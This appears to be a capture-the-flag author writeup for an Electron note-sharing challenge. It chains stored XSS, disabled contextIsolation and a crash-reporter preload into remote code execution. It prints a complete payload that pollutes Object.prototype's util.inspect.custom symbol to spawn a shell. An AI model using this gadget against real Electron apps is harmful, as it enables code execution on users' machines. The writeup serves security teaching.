# NativeNote — Author Writeup

## Overview

NativeNote is an HTML note-sharing app where an admin reviews flagged notes
in a custom Electron desktop client. The flag lives at `/flag` (and in
`process.env.FLAG`) inside the bot container; it's only reachable through
RCE in the bot's renderer.

---

## Step 1 — Stored XSS in the note view

`templates/note.html` renders the note body with `{{ content | safe }}` —
no escaping. Any `<script>` in a note runs verbatim when the bot opens
the page.

---

## Step 2 — Electron security misconfig

`bot/main.js`:

```js
webPreferences: {
    contextIsolation: false,   // renderer + preload share one V8 heap
    sandbox: false,
    nodeIntegration: false,
    preload: path.join(__dirname, 'preload.js'),
}
```

`contextIsolation: false` is the keystone: the renderer page and the
preload script run in the **same V8 isolate**. They share
`Object.prototype`, all globals, and every prototype mutation in the
renderer reaches objects the preload created.

---

## Step 3 — Reversing the preload bundle

The minified `preload.js` deobfuscates to a plausible Sentry-style
crash reporter:

```js
const { ipcRenderer } = require('electron');
const util = require('util');

const reportRendererCrash = (kind, payload) => {
    const ctx = {
        kind,
        payload,
        location: location.href,
        title: document.title,
        userAgent: navigator.userAgent,
        runtime: process,                 // ← the bug
        at: new Date().toISOString(),
    };
    try {
        ipcRenderer.send('renderer-crash',
            util.inspect(ctx, { depth: 3, breakLength: 120 }));
    } catch (_) {}
};

window.addEventListener('error',              e => reportRendererCrash('error', e.message || String(e)));
window.addEventListener('unhandledrejection', e => reportRendererCrash('unhandledrejection', String(e.reason)));

window.noteAPI = { ping: () => ipcRenderer.invoke('ping') };
```

Two real-world problems are visible:

1. **`runtime: process` shouldn't be in a crash payload.** A real reporter
   would extract `{ versions, platform, pid }`. Including the live
   `process` object means `util.inspect` recursively walks every
   property — and that's where the gadget will land.
2. **The trigger is event-driven.** Anything that produces an uncaught
   error or an unhandled promise rejection fires the handler, including
   the un-handled `noteAPI.ping()` rejection (no `'ping'` channel is
   registered in main).

---

## Step 4 — The novel gadget: `Object.prototype[util.inspect.custom]`

### What `util.inspect` does on every value

Node `lib/internal/util/inspect.js` (paraphrased):

```js
function formatValue(ctx, value, recurseTimes, typedArray) {
    ...
    if (ctx.customInspect) {
        const maybeCustom = value[customInspectSymbol];   // ← prototype walk
        if (typeof maybeCustom === 'function' &&
                maybeCustom !== inspect &&
                !(value.constructor &&
                  value.constructor.prototype === value)) {
            const ret = maybeCustom.call(value, ...);     // ← `this` = value
            if (ret !== value) {
                if (typeof ret !== 'string')
                    return formatValue(ctx, ret, recurseTimes);
                return ctx.stylize(...);
            }
            // ret === value: fall through to default property-walking
        }
    }
    ...
}
```

`customInspectSymbol` is `Symbol.for('nodejs.util.inspect.custom')` — in
the **global Symbol registry**, so the renderer can produce the same
Symbol Node uses internally:

```js
const customInspect = Symbol.for('nodejs.util.inspect.custom');
```

The lookup `value[customInspectSymbol]` is a plain prototype-walked
property access. Defining a value on `Object.prototype` for that key
means every `util.inspect(x)` call invokes our function with `this = x`.

### The recursion trick — `return this`

Returning a string short-circuits Node's formatter at the outer object
and never recurses into its properties — so we'd only ever see the outer
context. Returning **`this`** instead makes `ret === value` (the
`if (ret !== value)` test is false), Node skips the custom-inspect
branch entirely, falls through to default object-formatting, and
recursively `formatValue`s each property. The next call up is
`formatValue(ctx, process, …)` — and our hook fires again, this time
with `this = process`.

### From `this = process` to RCE

`process.binding('process_wrap').Process` is the same native class
`require('child_process').ChildProcess` uses internally
(`internalBinding('process_wrap').Process`). Instantiating it gives a
fresh native handle whose `.spawn(opts)` runs an arbitrary command:

```js
const Process = this.binding('process_wrap').Process;
new Process().spawn({
    file: '/bin/sh',
    args: ['sh', '-c', CMD],
    stdio: [{type:'ignore'},{type:'ignore'},{type:'ignore'}],
    envPairs: ['PATH=/usr/bin:/bin'],
    cwd: '/',
    windowsHide: false,
    detached: false,
});
```

We never `require('child_process')`, never construct a JS-side
`ChildProcess`, and never trip the published `_handle` / `spawnfile` /
`shell` / `argv0` / `env` setter gadgets.

---

## Step 5 — Putting it together

```js
(() => {
    const CMD = 'cat /flag > /tmp/notes_output/<OUTPUT_ID>.html';
    const customInspect = Symbol.for('nodejs.util.inspect.custom');
    let fired = false;

    Object.defineProperty(Object.prototype, customInspect, {
        configurable: true,
        value: function () {
            if (!fired && this !== null && typeof this === 'object' &&
                    typeof this.binding === 'function' &&
                    typeof this.dlopen  === 'function') {
                fired = true;
                try {
                    const Process = this.binding('process_wrap').Process;
                    new Process().spawn({
                        file: '/bin/sh',
                        args: ['sh', '-c', CMD],
                        stdio: [{type:'ignore'},{type:'ignore'},{type:'ignore'}],
                        envPairs: ['PATH=/usr/bin:/bin'],
                        cwd: '/',
                        windowsHide: false,
                        detached: false,
                    });
                } catch (_) {}
            }
            return this;   // critical — see Step 4
        },
    });

    // Trigger the preload's crash reporter.  Any uncaught error or
    // unhandled rejection works; this is the cleanest one because
    // the IPC channel isn't registered, so awaiting nothing means
    // the rejection bubbles into `unhandledrejection` automatically.
    window.noteAPI.ping();
})();
```

Then read the flag at `GET /out/<OUTPUT_ID>.html`.

Other equivalent triggers (any one of these fires the handler):
- `throw new Error('x')` (uncaught)
- `Promise.reject('x')` (no `.catch`)
- `setTimeout(() => undefined.foo, 0)`

---

## Comparison with published gadgets

| Challenge | Trigger | Hook | Setter `this` |
|---|---|---|---|
| HITCON 2023 Harmony | renderer calls into preload | `Object.prototype['./lib/renderer/api/ipc-renderer.ts']` setter | webpack module obj |
| TET CTF 2024 | renderer calls into preload | `Function.prototype.call` (4-arg) | varies |
| web-elec / 0xl4ugh | renderer calls into preload | `Object.prototype.spawnfile` setter | `ChildProcess` |
| `console.log` gadget | renderer logs an object | `console.log` override | n/a |
| **NativeNote** | **uncaught error / unhandled rejection (Sentry-style preload)** | **`Object.prototype[Symbol.for('nodejs.util.inspect.custom')]`** | **`process`** |

Distinguishing features:

- **Trigger is an event listener every real Electron app installs** — the
  preload looks like a Sentry-style crash reporter, with the realistic
  bug of including `process` in the diagnostic context. Players don't
  call any custom API from their exploit; firing an unhandled rejection
  is enough.
- **No spawn primitives in the exploit's call path** — no `execFile`,
  no `spawn`, no `require('child_process')`, no `ChildProcess`
  construction. The chain is `util.inspect` → polluted custom-inspect →
  `process.binding('process_wrap').Process`.
- **Hook key is a documented Node Symbol** (`util.inspect.custom`)
  rather than an internal slot like `_handle` or `spawnfile`.
- **Setter `this` is `process`** — reached not through a wrapper class
  but by Node's recursive value-walker hitting the `runtime: process`
  field of the crash context.
- **`return this` recursion trick** — required to make the outer hit
  fall through so the inner walk reaches `runtime: process`.

---

## Hardening that's already applied

The challenge ships with multiplayer guards in `app.py`:

- `BoundedSemaphore(MAX_CONCURRENT_BOTS=4)` so spam queues instead of
  forking 100 Electron processes
- 20 s per-user `/report` cooldown → 429 with friendly message
- `/report` rejects another player's note ID (404)
- Persistent secret key at `/tmp/.flask_secret` survives the 15 min
  auto-restart
- 1 hr janitor on `/tmp/notes_output`
- Title (200) / content (32 KB) / username (64) / password (128) length caps

---

## Automated solver

```
python3 solve.py http://<challenge-host>
```
